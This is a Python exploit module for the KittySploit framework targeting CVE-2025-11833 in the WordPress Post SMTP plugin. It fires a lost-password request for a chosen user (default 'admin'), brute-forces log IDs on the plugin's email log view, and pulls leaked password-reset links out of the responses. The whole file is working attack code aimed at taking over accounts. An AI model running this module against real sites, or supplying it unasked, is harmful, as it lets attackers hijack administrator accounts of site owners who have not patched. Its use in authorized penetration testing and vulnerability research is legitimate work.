#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Post SMTP CVE-2025-11833 — read logged emails / reset links."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Post SMTP CVE-2025-11833 email log read",
        "description": "Bruteforces log_id on postman_email_log view after lostpassword.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-11833"],
        "tags": ["wordpress", "post-smtp", "disclosure", "cve-2025-11833"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("admin", "Username", required=False)
    log_id = OptInteger(0, "Specific log_id (0 = scan 1-30)", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _fetch(self, log_id: int) -> str:
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            params={
                "action": "lostpassword",
                "page": "postman_email_log",
                "view": "log",
                "log_id": str(log_id),
            },
            data={"user_login": self.username or "admin", "wp-submit": "Get New Password"},
            allow_redirects=False,
        )
        return resp.text or "" if resp else ""

    def run(self):
        ids = [int(self.log_id)] if int(self.log_id or 0) > 0 else list(range(1, 31))
        for lid in ids:
            body = self._fetch(lid)
            if "key=" in body and "visit the following address" in body:
                links = re.findall(r'(https?://[^\s<"]+wp-login\.php\?[^\s<"]+key=[^\s<"]+)', body)
                print_success(f"log_id={lid} leaked reset content")
                for link in links[:2]:
                    print_status(link)
                return True
        print_error("No email log entries found in range")
        return False
